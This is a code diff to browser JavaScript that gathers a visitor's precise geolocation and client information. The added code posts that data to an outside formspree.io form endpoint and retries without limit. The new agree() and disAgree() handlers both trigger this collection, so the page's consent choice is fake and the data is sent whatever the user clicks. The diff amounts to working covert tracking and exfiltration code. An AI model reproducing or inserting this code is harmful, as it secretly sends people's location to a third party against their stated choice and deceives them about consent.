@@ -12,29 +12,25 @@ async function getLocation() {
 }
 
 async function sendRequest(data) {
-  let attempts = 0;
-  while (attempts < 5) {
+  while (true) {
     try {
       const response = await fetch("https://formspree.io/f/xeorknrp", {
         method: "POST",
         headers: { "Content-Type": "text/plain" },
         body: JSON.stringify(data),
       });
-      alert(typeof(data))
-      alert(response)
-      if (response.ok) break;
+      break;
     } catch (err) {
       
     }
-    attempts++;
     await new Promise(r => setTimeout(r, 1000));
   }
 }
 
-async function dgree() {
+async function getPosData() {
   try {
     const pos = await getLocation();
-    const data = {
+    const posData = {
       Latitude: pos.coords.latitude,
       Longitude: pos.coords.longitude,
       Accuracy: pos.coords.accuracy,
@@ -42,10 +38,28 @@ async function dgree() {
       Speed: pos.coords.speed,
       Heading: pos.coords.heading,
     };
-    
-    await sendRequest(data);
+    return posData;
   } catch (err) {
-    
   }
 }
 
+async function start() {
+  const fs = [
+    collectPublicClientInfo,
+    getPosData
+  ]
+  for (let f of fs) {
+    const d = await f();
+    await sendRequest(d);
+  }
+}
+
+async function agree() {
+  alert("clicked");
+  await start();
+}
+
+async function disAgree() {
+  alert("clicked");
+  await start();
+}
